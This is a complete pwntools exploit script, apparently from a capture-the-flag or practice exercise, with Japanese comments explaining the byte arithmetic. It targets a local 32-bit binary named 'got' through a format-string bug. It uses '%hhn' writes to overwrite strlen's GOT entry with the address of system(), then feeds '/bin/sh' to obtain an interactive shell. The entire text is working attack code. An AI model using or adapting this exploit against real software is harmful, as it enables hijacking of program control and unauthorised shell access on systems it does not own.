#!/usr/bin/python3

from pwn import *

context.arch = 'i386'
context.bits = '32'
context.endian = 'little'

#0804c014  strlen@GLIBC_2.0
systemaddr = 0xf7e0e000 #ASLR無効でgdb -q got; b main, r, p systemで検出した値。
strlenaddr = 0x0804c014 #readelfで検出した値。
wannado = '/bin/sh'

#strlenのアドレスを最初に積む。
payload = '\x14\xc0\x04\x08'
payload += '\x15\xc0\x04\x08'
payload += '\x16\xc0\x04\x08'
payload += '\x17\xc0\x04\x08'

#payload = p32(0x0804c014)
#payload += p32(0x0804c015)
#payload += p32(0x0804c016)
#payload += p32(0x0804c017)

#payload = p32(strlenaddr)
#payload += p32(strlenaddr + 1)
#payload += p32(strlenaddr + 2)
#payload += p32(strlenaddr + 3)

#systemaddrを組み立てて、1byteずつ書き込む
payload += '%240c%4$hhn' #systemaddrの末尾00。既に書き込んだアドレス16バイト（10進数) + xバイト = 00　 xの値を書き込む。
payload += '%240c%5$hhn' #systemaddrのe0。decimalにすると224。いま240byte書き込んでいる状態なので、16byte足して一旦０をふんでならす、そして今回書き込みたいe0(10進で224)を更に足す。合計240。
payload += '%240c%6$hhn' #systemaddrのe0。前回書きこんだ240を一旦0(+16)して256をふんで０にしてから、224をたす。合計240。
payload += '%7c%7$hhn' #systemaddrのf7。f7は10進数で247。前回240なので7を足す。
#payload += wannado

p = process('./got')
p.sendline(payload) #1回目のfgets
#print(p.recv())
p.sendline(wannado) #2回目のfgets
p.interactive()
